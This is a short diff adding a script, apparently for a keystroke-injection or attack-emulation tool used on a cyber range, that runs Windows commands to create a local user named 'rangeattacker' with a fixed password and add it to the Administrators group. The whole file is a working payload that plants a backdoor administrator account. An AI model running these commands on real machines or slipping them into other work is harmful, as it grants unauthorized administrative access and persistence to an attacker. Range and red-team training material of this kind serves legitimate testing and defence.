@@ -1,0 +1,8 @@
+STRINGS
+	"net user rangeattacker ForgeP@$$forge /ADD"
+	"timeout /T 8"
+	"net localgroup administrators rangeattacker /ADD"
+ENDSTRINGS
+CMD 
+USERWAIT
+
